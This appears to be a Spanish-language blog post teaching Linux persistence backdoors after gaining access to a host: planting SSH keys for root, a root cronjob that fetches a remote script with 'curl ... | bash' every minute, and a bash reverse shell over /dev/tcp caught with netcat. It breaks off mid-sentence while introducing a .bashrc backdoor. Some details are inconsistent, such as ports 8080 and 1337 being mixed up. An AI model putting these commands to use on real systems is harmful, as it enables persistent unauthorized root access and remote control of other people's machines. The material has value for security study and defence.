---
title: Accesos no autorizados en Linux - Info
published: true
---

# [](#header-1)Introducción
Este post está dedicado para aprender técnicas comunes para puertas traseras en linux. Basicamente un backdoor es algo que podemos hacer para garatizarnos de poder acceder al sistema de manera constante. Aunque la máquina se apague o se reinicie podremos seguir teniendo acceso.

Obviamente esto no es una vulnerabilidad, si no que son técnicas para mantenernos con acceso al objetivo.
## [](#header-2) Puertas traseras en SSH
Esta es nuestra primera técnica que veremos, ssh backdoors.
Principalmente, esto consiste en dejar nuestras llaves ssh en el directorio de inicio de un usuario. En la mayoría de casos, el directorio sería en el de root. ¿Por qué? Porque es el usuario con mayores privilegios. Para poder hacer eso, tenemos que crear un conjunto de llaves ssh con el comando `ssh-keygen`.

> ![image](https://github.com/cerodah/blog/assets/82907557/2dfda856-50c8-4627-a567-7928c02a7abe)

Ahora que tenemos la llave publica y la privada podemos dejarla en /root/.ssh. No olvides cambiar el nombre de la llave publica, normalmente tiene como extension `.pub`, a authorized_keys. Si el directorio no existe, simplemente crealo con `mkdir -p /root/.ssh`. El parametro `-p` asegurará que se cree el directorio ".ssh" en root y si existe, no generará ningún error por pantalla.

Lo más seguro es que tenga que otorgar los permisos necesarios a la llave privada para que la llave sea accesible solamente para el propietario y nadie más (además ssh se quejará si no lo hacemos...). Con el comando `chmod 600 id_rsa` se hace.
Hay que tener algo que en cuenta. Este "backdoor" no está oculto en absoluto, ya que cualquier usuario con permisos necesarios podrá eliminar tanto nuestra llave pública (authorized_keys) como nuestra llave privada!
## [](#header-2) Puertas traseras en Cronjobs
Ahora que hemos visto una técnica, ¿por qué no pasar a la otra?. Este método consiste en crear una tarea. 
En Linux las cronjobs (trabajos cron) son tareas programadas que se ejecutan automáticamente a intervalos especificados por el usuario. Como dato, este término se denomina así ya que viene de un servicio de planificación de tareas en sistemas de tipo Linux y Unix.
Esto es bastante útil ya que se puede aprovechar para hacer backups cada x tiempo, actualizaciones y ejecuciones de scripts. 

Ese archivo se encuentra en la ruta `/etc/crontab` y si miramos lo que hay, seguramente encuentre algo parecido a esto: 
> ![image](https://github.com/cerodah/blog/assets/82907557/23133ff3-c9c6-4e36-a98c-1a33759a9a4b)

Una vez que haya obtenido acceso a cualquier host podrá usted mismo agregar su propia tarea.
Si mira bien puede ver que está el simbolo (*) presente al lado del numero 17, esto significa que la tarea se ejecutará cada hora. Pues bien , para aprovecharnos podemos agregar esta linea a nuestro archivo cronjob
```bash
* *     * * *   root    curl http://$IP:8080/shell | bash
```
Si se fija he puesto varios "*". ¿Por qué? Así, le estamos diciendo que queremos que nuestra tarea se ejecute cada minuto. (cada minuto de cada hora, todos los días, todos los meses y todos los días de la semana). Despues indicamos al usuario en el que se ejecutará la tarea, en este caso, es root. Después con curl realiazamos una petición HTTP a la URL "http://$IP:1337/shell" y finalmente con la tubería (|) pasamos la salida de curl como entrada de bash. Dentro de el archivo shell esta este código.
```bash
#!/bin/bash
bash -i >& /dev/tcp/ip/puerto 0>&1
```
Para que esto funcione el archivo debe de ser cargado en algún sitio en este caso usaremos python.
```python
python3 -m http.server 8080
```
Tampoco olvides estar escuchando por el puerto 1337 con netcat.
> ![image](https://github.com/cerodah/blog/assets/82907557/3a314627-6f1e-4323-b000-98e5914e05af)

Como se puede observar en la terminal derecha, al estar esperando un minuto a llegado momento en el que el archivo crontab haga su trabajo y nos de una sesión como root! 

## [](#header-3) Puerta trasera en ".bashrc"
¿Cómo? Un backdoor en el archivo de configuración de bash. ¡Sí!
En la mayoría de sistemas Linux y Unix, por defecto la shell predeterminada es la de bash. En esta shell, encontramos su archivo de configuración (~/.bashrc) y es el que se ejecuta cada vez que se inicia una sesión interactiva.
Podemos ejecutar este comando el cual ejecutamos una instancia interactiva y posteriormente rediriccionamos la entrada y salida de bash hacia un socket de red


